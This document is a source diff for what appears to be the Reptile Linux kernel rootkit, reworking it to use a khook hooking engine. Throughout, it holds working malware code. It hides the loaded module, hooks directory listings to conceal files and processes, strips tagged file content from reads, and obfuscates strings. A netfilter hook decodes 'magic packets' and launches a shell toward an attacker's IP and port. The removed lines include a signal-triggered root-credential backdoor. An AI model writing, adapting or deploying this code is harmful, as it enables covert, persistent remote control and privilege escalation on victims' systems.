@@ -5,288 +5,347 @@
  *
  */
 
-#include <linux/module.h> 
-#include <linux/syscalls.h>
-#include <linux/kernel.h>
-#include <linux/unistd.h>
-#include <asm/pgtable.h>
-#include <linux/slab.h>
-#include <linux/cred.h>
+//#include <asm/pgtable.h>
 #include <asm/uaccess.h>
-#include <linux/sched.h>
+#include <linux/cred.h>
 #include <linux/dirent.h>
-#include <linux/slab.h>
-#include <linux/version.h> 
 #include <linux/file.h>
-#include <linux/workqueue.h>
+#include <linux/icmp.h>
+#include <linux/in.h>
 #include <linux/init.h>
+#include <linux/ip.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/net.h>
 #include <linux/netfilter.h>
 #include <linux/netfilter_ipv4.h>
-#include <linux/ip.h>
-#include <linux/icmp.h>
-#include <linux/tcp.h>
-#include <linux/udp.h>
+#include <linux/sched.h>
+#include <linux/seq_file.h>
+#include <linux/slab.h>
 #include <linux/string.h>
-#include "sbin/config.h"
+#include <linux/syscalls.h>
+#include <linux/tcp.h>
+#include <linux/uaccess.h>
+#include <linux/udp.h>
+#include <linux/unistd.h>
+#include <linux/version.h>
+#include <linux/workqueue.h>
+#include <net/inet_sock.h>
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-	#include <linux/proc_ns.h>
+#include <linux/proc_ns.h>
 #else
-	#include <linux/proc_fs.h>
+#include <linux/proc_fs.h>
 #endif
 #if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 26)
-	#include <linux/fdtable.h>
+#include <linux/fdtable.h>
 #endif
+
+#include "engine/engine.c"
+#include "engine/engine.h"
+
+#include "config.h"
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
-    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
+#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
 #else
-    	#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
+#define REPTILE_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
 #endif
 
-#define bzero(b,len) (memset((b), '\0', (len)), (void) 0)
-#define SIGROOT		48
-#define SIGHIDEPROC 	49
-#define SIGHIDEREPTILE 	50
-#define SIGHIDECONTENT  51
-#define SSIZE_MAX 	32767
-#define SYS_CALL_TABLE \
-({ \
-unsigned int *p = (unsigned int*)__builtin_alloca(16); \
- p[0] = 0x5f737973; \
- p[1] = 0x6c6c6163; \
- p[2] = 0x6261745f; \
- p[3] = 0x0000656c; \
- (char *)p; \
-})
+#define bzero(b, len) (memset((b), '\0', (len)), (void)0)
+#define SSIZE_MAX 32767
+#define AUTH 0xdeadbeef
+#define HTUA 0xc0debabe
+#define RL_BUFSIZE 2048
+#define TOK_BUFSIZE 64
+#define TOK_DELIM                                                              \
+	({                                                                     \
+		unsigned int *p = __builtin_alloca(4);                         \
+		p[0] = 0x00000020;                                             \
+		(char *)p;                                                     \
+	})
+#define ID 12345
+#define SEQ 28782
+#define WIN 8192
+#define TMPSZ 150
 
-#define SYS_CLOSE \
-({ \
-unsigned int *p = (unsigned int*)__builtin_alloca(12); \
- p[0] = 0x5f737973; \
- p[1] = 0x736f6c63; \
- p[2] = 0x00000065; \
- (char *)p; \
-})
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
+#define VFS_READ                                                               \
+	({                                                                     \
+		unsigned int *p = (unsigned int *)__builtin_alloca(9);         \
+		p[0] = 0x5f736676;                                             \
+		p[1] = 0x64616572;                                             \
+		p[2] = 0x00;                                                   \
+		(char *)p;                                                     \
+	})
 
-int hidden = 0, hide_file_content = 1;
+asmlinkage ssize_t (*vfs_read_addr)(struct file *file, char __user *buf,
+				    size_t count, loff_t *pos);
+#endif
+
+int hidden = 0, hide_file_content = 0, control_flag = 0;
 struct workqueue_struct *work_queue;
 static struct nf_hook_ops magic_packet_hook_options;
 static struct list_head *mod_list;
-static unsigned long *sct;
-atomic_t read_on;
 
-#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-	#define VFS_READ \
-	({ \
-	unsigned int *p = (unsigned int*)__builtin_alloca(9); \
-	 p[0] = 0x5f736676; \
-	 p[1] = 0x64616572; \
-	 p[2] = 0x00; \
-	 (char *)p; \
-	})
-
-    	asmlinkage ssize_t (*vfs_read_addr)(struct file *file, char __user *buf, size_t count, loff_t *pos);
-#endif
-
-asmlinkage int (*o_kill)(pid_t pid, int sig);
-asmlinkage int (*o_getdents64)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
-asmlinkage int (*o_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-asmlinkage ssize_t (*o_read)(unsigned int fd, char __user *buf, size_t count);
-
-asmlinkage int l33t_kill(pid_t pid, int sig);
-asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
-asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
-asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count);
+struct control {
+	unsigned short cmd;
+	void *argv;
+};
 
 struct shell_task {
-    	struct work_struct work;
-    	char *path;
-    	char *ip;
-    	char *port;
+	struct work_struct work;
+	char *path;
+	char *ip;
+	char *port;
+	char *secret;
 };
 
 struct linux_dirent {
-        unsigned long   d_ino;
-        unsigned long   d_off;
-        unsigned short  d_reclen;
-        char            d_name[1];
+	unsigned long d_ino;
+	unsigned long d_off;
+	unsigned short d_reclen;
+	char d_name[1];
 };
+
+struct hidden_conn {
+	struct sockaddr_in addr;
+	struct list_head list;
+};
+
+LIST_HEAD(hidden_tcp_conn);
 
 struct ksym {
-    char *name;
-    unsigned long addr;
+	char *name;
+	unsigned long addr;
 };
 
-int find_ksym(void *data, const char *name, struct module *module, unsigned long address) {
-    struct ksym *ksym = (struct ksym *)data;
-    char *target = ksym->name;
+int find_ksym(void *data, const char *name, struct module *module,
+	      unsigned long address)
+{
+	struct ksym *ksym = (struct ksym *)data;
+	char *target = ksym->name;
 
-    if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
-        ksym->addr = address;
-        return 1;
-    }
+	if (strncmp(target, name, KSYM_NAME_LEN) == 0) {
+		ksym->addr = address;
+		return 1;
+	}
 
-    return 0;
+	return 0;
 }
 
-unsigned long get_symbol(char *name) {
-    unsigned long symbol = 0;
-    struct ksym ksym;
+unsigned long get_symbol(char *name)
+{
+	unsigned long symbol = 0;
+	struct ksym ksym;
 
-    ksym.name = name;
-    ksym.addr = 0;
-    kallsyms_on_each_symbol(&find_ksym, &ksym);
-    symbol = ksym.addr;
+	ksym.name = name;
+	ksym.addr = 0;
+	kallsyms_on_each_symbol(&find_ksym, &ksym);
+	symbol = ksym.addr;
 
-    return symbol;
+	return symbol;
 }
 
-void hide(void) {
-	if(hidden) return;
+void hide(void)
+{
+	if (hidden)
+		return;
 
-	while(!mutex_trylock(&module_mutex)) cpu_relax();
+	while (!mutex_trylock(&module_mutex))
+		cpu_relax();
 	mod_list = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 	kfree(THIS_MODULE->sect_attrs);
-        THIS_MODULE->sect_attrs = NULL;
+	THIS_MODULE->sect_attrs = NULL;
 	mutex_unlock(&module_mutex);
 	hidden = 1;
 }
 
-void show(void) {
-	if(!hidden) return;
+void show(void)
+{
+	if (!hidden)
+		return;
 
-	while(!mutex_trylock(&module_mutex)) cpu_relax();
+	while (!mutex_trylock(&module_mutex))
+		cpu_relax();
 	list_add(&THIS_MODULE->list, mod_list);
 	mutex_unlock(&module_mutex);
 	hidden = 0;
 }
 
-struct task_struct *find_task(pid_t pid){
+struct task_struct *find_task(pid_t pid)
+{
 	struct task_struct *p = current;
-	struct task_struct *ret = NULL;	
+	struct task_struct *ret = NULL;
 
 	rcu_read_lock();
-	for_each_process(p) {
+	for_each_process(p)
+	{
 		if (p->pid == pid) {
 			get_task_struct(p);
 			ret = p;
 		}
 	}
-	rcu_read_unlock();	
+	rcu_read_unlock();
 
 	return ret;
 }
 
-int is_invisible(pid_t pid){
+int is_invisible(pid_t pid)
+{
 	struct task_struct *task;
 	int ret = 0;
 
-	if (!pid) return ret;
+	if (!pid)
+		return ret;
 	task = find_task(pid);
-	if (!task) return ret;
-	if (task->flags & 0x10000000) ret = 1;
+	if (!task)
+		return ret;
+	if (task->flags & 0x10000000)
+		ret = 1;
 	put_task_struct(task);
 	return ret;
 }
 
-void exec(char **argv){
-	static char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+void exec(char **argv)
+{
+	char *path = PATH;
+	char *envp[] = {path, NULL};
 	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
-void shell_execer(struct work_struct *work) {
-    	struct shell_task *task = (struct shell_task *)work;
-    	char *argv[] = { task->path, "-t", task->ip, "-p", task->port, NULL };
+void shell_execer(struct work_struct *work)
+{
+	struct shell_task *task = (struct shell_task *)work;
+	char *argv[] = {task->path,
+			({
+				unsigned int *p = __builtin_alloca(4);
+				p[0] = 0x0000742d;
+				(char *)p;
+			}),
+			task->ip,
+			({
+				unsigned int *p = __builtin_alloca(4);
+				p[0] = 0x0000702d;
+				(char *)p;
+			}),
+			task->port,
+			({
+				unsigned int *p = __builtin_alloca(4);
+				p[0] = 0x0000732d;
+				(char *)p;
+			}),
+			task->secret,
+			NULL};
 
-    	exec(argv);
+	exec(argv);
 	kfree(task->path);
 	kfree(task->ip);
 	kfree(task->port);
+	kfree(task->secret);
 	kfree(task);
 }
 
-int shell_exec_queue(char *path, char *ip, char *port) {
-    	struct shell_task *task;
+int shell_exec_queue(char *path, char *ip, char *port, char *secret)
+{
+	struct shell_task *task;
 
-    	task = kmalloc(sizeof(*task), GFP_KERNEL);
-    
-    	if(!task) return -1;
+	task = kmalloc(sizeof(*task), GFP_KERNEL);
 
-    	REPTILE_INIT_WORK(&task->work, &shell_execer);
-    	task->path = kstrdup(path, GFP_KERNEL);
-	if(!task->path) {
+	if (!task)
+		return -1;
+
+	REPTILE_INIT_WORK(&task->work, &shell_execer);
+	task->path = kstrdup(path, GFP_KERNEL);
+	if (!task->path) {
 		kfree(task);
 		return -1;
 	}
 
 	task->ip = kstrdup(ip, GFP_KERNEL);
-	if(!task->ip) {
+	if (!task->ip) {
 		kfree(task->path);
 		kfree(task);
 		return -1;
-    	}
+	}
 
 	task->port = kstrdup(port, GFP_KERNEL);
-	if(!task->port) { 
+	if (!task->port) {
 		kfree(task->path);
 		kfree(task->ip);
 		kfree(task);
 		return -1;
 	}
 
-    	return queue_work(work_queue, &task->work);
+	task->secret = kstrdup(secret, GFP_KERNEL);
+	if (!task->secret) {
+		kfree(task->path);
+		kfree(task->ip);
+		kfree(task->port);
+		kfree(task);
+		return -1;
+	}
+
+	return queue_work(work_queue, &task->work);
 }
 
-struct file *e_fget_light(unsigned int fd, int *fput_needed) {
-    	struct file *file;
-    	struct files_struct *files = current->files;
+struct file *e_fget_light(unsigned int fd, int *fput_needed)
+{
+	struct file *file;
+	struct files_struct *files = current->files;
 
-    	*fput_needed = 0;
-    	if (likely((atomic_read(&files->count) == 1))) {
-        	file = fcheck(fd);
-    	} else {
-        	spin_lock(&files->file_lock);
-        	file = fcheck(fd);
-        	if (file) {
-           		get_file(file);
-            		*fput_needed = 1;
-        	}
-        	spin_unlock(&files->file_lock);
-    	}
-    	return file;
+	*fput_needed = 0;
+	if (likely((atomic_read(&files->count) == 1))) {
+		file = fcheck(fd);
+	} else {
+		spin_lock(&files->file_lock);
+		file = fcheck(fd);
+		if (file) {
+			get_file(file);
+			*fput_needed = 1;
+		}
+		spin_unlock(&files->file_lock);
+	}
+	return file;
 }
 
-int f_check(void *arg, ssize_t size) {
+int f_check(void *arg, ssize_t size)
+{
 	char *buf;
 
-	if ((size <= 0) || (size >= SSIZE_MAX)) return(-1);
+	if ((size <= 0) || (size >= SSIZE_MAX))
+		return (-1);
 
-	buf = (char *) kmalloc(size+1, GFP_KERNEL);
-	if(!buf) return(-1);
+	buf = (char *)kmalloc(size + 1, GFP_KERNEL);
+	if (!buf)
+		return (-1);
 
-	if(copy_from_user((void *) buf, (void *) arg, size)) goto out;
+	if (copy_from_user((void *)buf, (void *)arg, size))
+		goto out;
 
 	buf[size] = 0;
 
-	if ((strstr(buf, HIDETAGIN) != NULL) && (strstr(buf, HIDETAGOUT) != NULL)) {
+	if ((strstr(buf, HIDETAGIN) != NULL) &&
+	    (strstr(buf, HIDETAGOUT) != NULL)) {
 		kfree(buf);
-		return(1);
+		return (1);
 	}
 out:
 	kfree(buf);
-	return(-1);
+	return (-1);
 }
 
-int hide_content(void *arg, ssize_t size) {
+int hide_content(void *arg, ssize_t size)
+{
 	char *buf, *p1, *p2;
 	int i, newret;
 
-	buf = (char *) kmalloc(size, GFP_KERNEL);
-	if(!buf) return(-1);
+	buf = (char *)kmalloc(size, GFP_KERNEL);
+	if (!buf)
+		return (-1);
 
-	if(copy_from_user((void *) buf, (void *) arg, size)) {
+	if (copy_from_user((void *)buf, (void *)arg, size)) {
 		kfree(buf);
 		return size;
 	}
@@ -295,16 +354,16 @@ int hide_content(void *arg, ssize_t size) {
 	p2 = strstr(buf, HIDETAGOUT);
 	p2 += strlen(HIDETAGOUT);
 
-	if(p1 >= p2 || !p1 || !p2) {
+	if (p1 >= p2 || !p1 || !p2) {
 		kfree(buf);
 		return size;
 	}
 
 	i = size - (p2 - buf);
-	memmove((void *) p1, (void *) p2, i);
+	memmove((void *)p1, (void *)p2, i);
 	newret = size - (p2 - p1);
 
-	if(copy_to_user((void *) arg, (void *) buf, newret)) {
+	if (copy_to_user((void *)arg, (void *)buf, newret)) {
 		kfree(buf);
 		return size;
 	}
@@ -313,254 +372,326 @@ int hide_content(void *arg, ssize_t size) {
 	return newret;
 }
 
-void s_xor(char *arg, int key, int nbytes) {
-        int i;
-        for(i = 0; i < nbytes; i++) arg[i] ^= key;
+char **parse(char *line)
+{
+	int bufsize = TOK_BUFSIZE, position = 0;
+	char **tokens = kmalloc(bufsize * sizeof(char *), GFP_KERNEL);
+	char *token, **tokens_backup;
+
+	if (!tokens)
+		return NULL;
+
+	token = line;
+	token = strsep(&line, TOK_DELIM);
+	while (token != NULL) {
+		tokens[position] = token;
+		position++;
+
+		if (position >= bufsize) {
+			bufsize += TOK_BUFSIZE;
+			tokens_backup = tokens;
+			tokens = krealloc(tokens, bufsize * sizeof(char *),
+					  GFP_KERNEL);
+			if (!tokens) {
+				kfree(tokens_backup);
+				return NULL;
+			}
+		}
+
+		token = strsep(&line, TOK_DELIM);
+	}
+	tokens[position] = NULL;
+	return tokens;
 }
 
-int atoi(char *str){
-	int i, result = 0;
-	for(i = 0; str[i] != '\0'; i++) result = result*10 + str[i] - '\0';
-
-	return result;
+void _xor(char *arg, int key, int nbytes)
+{
+	int i;
+	for (i = 0; i < nbytes; i++)
+		arg[i] ^= key;
 }
 
-void decode_n_spawn(const char *data) {
-	int tsize;
-	char *ip, *port, *p = NULL, *buf = NULL, *tok = NULL, *token = TOKEN; 
-
-    	tsize = strlen(token);
-	p = (char *) kmalloc(tsize+24, GFP_KERNEL);
-	if(!p) return;
-
-	buf = p; // save the base pointer to free it right
-
-        bzero(buf, tsize+24);
-        memcpy(buf, data, tsize+24);
-        s_xor(buf, 11, strlen(buf));
-	tok = buf;
-	strsep(&buf, " ");
-	ip = buf;
-	strsep(&buf, " ");
-	port = buf;
-	strsep(&buf, " ");
-
-	if(!tok || !ip || !port) goto out;
-
-	if(strcmp(token, tok) == 0 && atoi(port) > 0 && atoi(port) <= 65535 && strlen(ip) >= 7 && strlen(ip) <= 15) shell_exec_queue(SHELL, ip, port);
-
-out:
-	kfree(p);
+void _add(char *arg, int key, int nbytes)
+{
+	int i;
+	for (i = 0; i < nbytes; i++)
+		arg[i] += key;
 }
 
-unsigned int magic_packet_hook(const struct nf_hook_ops *ops, struct sk_buff *socket_buffer, 
-			       const struct net_device *in, const struct net_device *out, 
-			       int (*okfn)(struct sk_buff *)) {
-    	
-	const struct iphdr   *ip_header;
-    	const struct icmphdr *icmp_header;
-    	const struct tcphdr  *tcp_header;
-    	const struct udphdr  *udp_header;
-	struct iphdr	_iph;
-    	struct icmphdr	_icmph;
-	struct tcphdr	_tcph;
-	struct udphdr	_udph;
-	const char *data;
+void _sub(char *arg, int key, int nbytes)
+{
+	int i;
+	for (i = 0; i < nbytes; i++)
+		arg[i] -= key;
+}
+
+unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
+			       struct sk_buff *socket_buffer,
+			       const struct net_device *in,
+			       const struct net_device *out,
+			       int (*okfn)(struct sk_buff *))
+{
+	const struct iphdr *ip_header;
+	const struct icmphdr *icmp_header;
+	const struct tcphdr *tcp_header;
+	const struct udphdr *udp_header;
+	struct iphdr _iph;
+	struct icmphdr _icmph;
+	struct tcphdr _tcph;
+	struct udphdr _udph;
+	const char *data = NULL;
+	char *_data, *string, **args;
 	char *token = TOKEN;
-    	int tsize = strlen(token);
-	char _dt[tsize+11];
+	int size, tok_len;
 
-    	s_xor(token, 11, tsize);
+	tok_len = strlen(token);
+	_xor(token, 11, tok_len);
+	_add(token, 15, tok_len);
 
-    	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
+	if (!socket_buffer)
+		return NF_ACCEPT;
 
-    	if (!ip_header) return NF_ACCEPT;
+	ip_header = skb_header_pointer(socket_buffer, 0, sizeof(_iph), &_iph);
 
-     	if (ip_header->protocol == IPPROTO_ICMP) {
-        	icmp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_icmph), &_icmph);
+	if (!ip_header)
+		return NF_ACCEPT;
 
-        	if (!icmp_header) return NF_ACCEPT;
+	if (!ip_header->protocol)
+		return NF_ACCEPT;
 
-        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct icmphdr), sizeof(_dt), &_dt);
+	if (htons(ip_header->id) != ID)
+		return NF_ACCEPT;
 
-    		if (!data) return NF_ACCEPT;
+	if (ip_header->protocol == IPPROTO_TCP) {
+		tcp_header = skb_header_pointer(
+		    socket_buffer, ip_header->ihl * 4, sizeof(_tcph), &_tcph);
 
-    		if ((icmp_header->code == ICMP_ECHO) && (memcmp(data, token, tsize) == 0)){
-    			decode_n_spawn(data);
-			return NF_DROP;
-    		}
-    	}
-     
-     	if (ip_header->protocol == IPPROTO_TCP) {
-        	tcp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_tcph), &_tcph);
+		if (!tcp_header)
+			return NF_ACCEPT;
 
-        	if (!tcp_header) return NF_ACCEPT;
+		if (htons(tcp_header->source) != SRCPORT)
+			return NF_ACCEPT;
 
-        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct tcphdr), sizeof(_dt), &_dt);
-    		
-		if (!data) return NF_ACCEPT;
+		if (htons(tcp_header->seq) == SEQ &&
+		    htons(tcp_header->window) == WIN) {
 
-		if(htons(tcp_header->source) == SRCPORT && htons(tcp_header->dest) == TCPPORT && memcmp(data, token, tsize) == 0){
-			decode_n_spawn(data);
-			return NF_DROP;
+			size = htons(ip_header->tot_len) - sizeof(_iph) -
+			       sizeof(_tcph);
+
+			_data = kmalloc(size, GFP_KERNEL);
+
+			if (!_data)
+				return NF_ACCEPT;
+
+			string = kmalloc(size + 1, GFP_KERNEL);
+
+			if (!string) {
+				kfree(_data);
+				return NF_ACCEPT;
+			}
+
+			data = skb_header_pointer(socket_buffer,
+						  ip_header->ihl * 4 +
+						      sizeof(struct tcphdr),
+						  size, &_data);
+
+			if (!data) {
+				kfree(_data);
+				kfree(string);
+				return NF_ACCEPT;
+			}
+
+			if (memcmp(data, token, tok_len) == 0) {
+
+				bzero(string, size + 1);
+				memcpy(string, data, size);
+
+				_sub(string, 15, size);
+				_xor(string, 11, size);
+
+				args = parse(string);
+
+				if (args) {
+					shell_exec_queue(SHELL, args[1],
+							 args[2], PASS);
+					kfree(args);
+				}
+
+				kfree(_data);
+				kfree(string);
+
+				return NF_DROP;
+			}
+
+			kfree(_data);
+			kfree(string);
 		}
-    	}
-     
-     	if (ip_header->protocol == IPPROTO_UDP) {
-        	udp_header = skb_header_pointer(socket_buffer, ip_header->ihl*4, sizeof(_udph), &_udph);
+	}
 
-        	if (!udp_header) return NF_ACCEPT;
+	if (ip_header->protocol == IPPROTO_ICMP) {
+		icmp_header = skb_header_pointer(
+		    socket_buffer, ip_header->ihl * 4, sizeof(_icmph), &_icmph);
 
-        	data = skb_header_pointer(socket_buffer, ip_header->ihl*4 + sizeof(struct udphdr), sizeof(_dt), &_dt);
-    		
-		if (!data) return NF_ACCEPT;
+		if (!icmp_header)
+			return NF_ACCEPT;
 
-		if(htons(udp_header->source) == SRCPORT && htons(udp_header->dest) == UDPPORT && memcmp(data, token, tsize) == 0){
-			decode_n_spawn(data);
-			return NF_DROP;
+		if (icmp_header->code != ICMP_ECHO)
+			return NF_ACCEPT;
+
+		if (htons(icmp_header->un.echo.sequence) == SEQ &&
+		    htons(icmp_header->un.echo.id) == WIN) {
+
+			size = htons(ip_header->tot_len) - sizeof(_iph) -
+			       sizeof(_icmph);
+
+			_data = kmalloc(size, GFP_KERNEL);
+
+			if (!_data)
+				return NF_ACCEPT;
+
+			string = kmalloc(size + 1, GFP_KERNEL);
+
+			if (!string) {
+				kfree(_data);
+				return NF_ACCEPT;
+			}
+
+			data = skb_header_pointer(socket_buffer,
+						  ip_header->ihl * 4 +
+						      sizeof(struct icmphdr),
+						  size, &_data);
+
+			if (!data) {
+				kfree(_data);
+				kfree(string);
+				return NF_ACCEPT;
+			}
+
+			if (memcmp(data, token, tok_len) == 0) {
+
+				bzero(string, size + 1);
+				memcpy(string, data, size);
+
+				_sub(string, 15, size);
+				_xor(string, 11, size);
+
+				args = parse(string);
+
+				if (args) {
+					shell_exec_queue(SHELL, args[1],
+							 args[2], PASS);
+
+					kfree(args);
+				}
+
+				kfree(_data);
+				kfree(string);
+
+				return NF_DROP;
+			}
+
+			kfree(_data);
+			kfree(string);
 		}
-    	}
-    	return NF_ACCEPT;
-}
-
-void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size) {
-    	char *p;
-
-    	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++) {
-        	if(memcmp(p, needle, needle_size) == 0) return (void *)p;
-    	}
-    	return NULL;
-}
-
-#ifdef __x86_64__
-
-unsigned long *find_sys_call_table(void) {
-	unsigned long sct_off = 0;
-    	unsigned char code[512];
-    	char **p;
-
-    	rdmsrl(MSR_LSTAR, sct_off);
-    	memcpy(code, (void *)sct_off, sizeof(code));
-
-    	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
-  
-    	if(p) {
-        	unsigned long *table = *(unsigned long **)((char *)p + 3);
-        	table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
-        	return table;
-    	}
-    	return NULL;
-}
-
-#else
-
-struct {
-	unsigned short limit;
-	unsigned long base;
-} __attribute__ ((packed))idtr;
-
-struct {
-	unsigned short off1;
-	unsigned short sel;
-    	unsigned char none, flags;
-    	unsigned short off2;
-} __attribute__ ((packed))idt;
-
-unsigned long *find_sys_call_table(void) {
-    	char **p;
-    	unsigned long sct_off = 0;
-    	unsigned char code[255];
-
-    	asm("sidt %0":"=m" (idtr));
-    	memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
-    	sct_off = (idt.off2 << 16) | idt.off1;
-    	memcpy(code, (void *)sct_off, sizeof(code));
-
-    	p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);
-
-    	if(p) return *(unsigned long **)((char *)p + 3);
-    	else return NULL;
-}
-
-#endif
-
-unsigned long *generic_find_sys_call_table(void){
-	unsigned long *syscall_table;
-	unsigned long _sys_close;
-	unsigned long int i;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
-	_sys_close = get_symbol(SYS_CLOSE);
-#endif
-
-	for (i = PAGE_OFFSET; i < ULONG_MAX; i += sizeof(void *)) {
-		syscall_table = (unsigned long *)i;
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
-		if (syscall_table[__NR_close] == (unsigned long)sys_close)
-#else 
-		if (syscall_table[__NR_close] == (unsigned long)_sys_close)
-#endif
-			return syscall_table;
 	}
-	return NULL;
-}
 
-asmlinkage int l33t_kill(pid_t pid, int sig){
+	if (ip_header->protocol == IPPROTO_UDP) {
+		udp_header = skb_header_pointer(
+		    socket_buffer, ip_header->ihl * 4, sizeof(_udph), &_udph);
 
-	struct task_struct *task;
+		if (!udp_header)
+			return NF_ACCEPT;
 
-	switch(sig) {
-		case SIGHIDEREPTILE:
-			if(hidden) show();
-			else hide();
-			break;
-		case SIGHIDEPROC:
-			if((task = find_task(pid)) == NULL) return -ESRCH;
+		if (htons(udp_header->source) != SRCPORT)
+			return NF_ACCEPT;
 
-			task->flags ^= 0x10000000;
-			put_task_struct(task);
-			break;
-		case SIGHIDECONTENT:
-			if(hide_file_content) hide_file_content = 0;
-			else hide_file_content = 1;
-			break;
-		case SIGROOT:
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
-                	current->uid   = 0;
-                	current->suid  = 0;
-                	current->euid  = 0;
-                	current->gid   = 0;
-                	current->egid  = 0;
-                	current->fsuid = 0;
-                	current->fsgid = 0;
-                	cap_set_full(current->cap_effective);
-                	cap_set_full(current->cap_inheritable);
-                	cap_set_full(current->cap_permitted);
-#else
-                	commit_creds(prepare_kernel_cred(0));
-#endif
-			break;
-		default:
-			return o_kill(pid, sig);
+		if (htons(udp_header->len) <=
+		    (sizeof(struct udphdr) + strlen(TOKEN) + 25)) {
+
+			size = htons(ip_header->tot_len) - sizeof(_iph) -
+			       sizeof(_udph);
+
+			_data = kmalloc(size, GFP_KERNEL);
+
+			if (!_data)
+				return NF_ACCEPT;
+
+			string = kmalloc(size + 1, GFP_KERNEL);
+
+			if (!string) {
+				kfree(_data);
+				return NF_ACCEPT;
+			}
+
+			data = skb_header_pointer(socket_buffer,
+						  ip_header->ihl * 4 +
+						      sizeof(struct udphdr),
+						  size, &_data);
+
+			if (!data) {
+				kfree(_data);
+				kfree(string);
+				return NF_ACCEPT;
+			}
+
+			if (memcmp(data, token, tok_len) == 0) {
+
+				bzero(string, size + 1);
+				memcpy(string, data, size);
+
+				_sub(string, 15, size);
+				_xor(string, 11, size);
+
+				args = parse(string);
+
+				if (args) {
+					shell_exec_queue(SHELL, args[1],
+							 args[2], PASS);
+
+					kfree(args);
+				}
+
+				kfree(_data);
+				kfree(string);
+
+				return NF_DROP;
+			}
+
+			kfree(_data);
+			kfree(string);
+		}
 	}
-	return 0;
+
+	return NF_ACCEPT;
 }
 
-asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
-	int ret = o_getdents64(fd, dirent, count); 
+KHOOK(sys_getdents64);
+static int khook_sys_getdents64(unsigned int fd,
+				struct linux_dirent64 __user *dirent,
+				unsigned int count)
+{
+	int ret;
 	unsigned short p = 0;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdir, *prev = NULL;
 	struct inode *d_inode;
 	char *hide = HIDE;
 
-	if (ret <= 0) return ret;
+	KHOOK_GET(sys_getdents64);
+	ret = KHOOK_ORIGIN(sys_getdents64, fd, dirent, count);
+
+	if (!hidden)
+		goto final;
+
+	if (ret <= 0)
+		goto final;
 
 	kdir = kzalloc(ret, GFP_KERNEL);
-	if (kdir == NULL) return ret;
+	if (kdir == NULL)
+		goto final;
 
-	if(copy_from_user(kdir, dirent, ret)) goto end;
+	if (copy_from_user(kdir, dirent, ret))
+		goto end;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
@@ -570,10 +701,12 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
 		p = 1;
 
-	while(off < ret) {
+	while (off < ret) {
 		dir = (void *)kdir + off;
-		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if(dir == kdir) {
+		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
+		    (p &&
+		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+			if (dir == kdir) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
 				continue;
@@ -584,27 +717,43 @@ asmlinkage int l33t_getdents64(unsigned int fd, struct linux_dirent64 __user *di
 		}
 		off += dir->d_reclen;
 	}
-	if(copy_to_user(dirent, kdir, ret)) goto end;
+	if (copy_to_user(dirent, kdir, ret))
+		goto end;
 
 end:
 	kfree(kdir);
+final:
+	KHOOK_PUT(sys_getdents64);
 	return ret;
 }
 
-asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
-	int ret = o_getdents(fd, dirent, count);
+KHOOK(sys_getdents);
+static int khook_sys_getdents(unsigned int fd,
+			      struct linux_dirent __user *dirent,
+			      unsigned int count)
+{
+	int ret;
 	unsigned short p = 0;
 	unsigned long off = 0;
 	struct linux_dirent *dir, *kdir, *prev = NULL;
 	struct inode *d_inode;
-	char *hide = HIDE;	
+	char *hide = HIDE;
 
-	if (ret <= 0) return ret;	
+	KHOOK_GET(sys_getdents);
+	ret = KHOOK_ORIGIN(sys_getdents, fd, dirent, count);
+
+	if (!hidden)
+		goto final;
+
+	if (ret <= 0)
+		goto final;
 
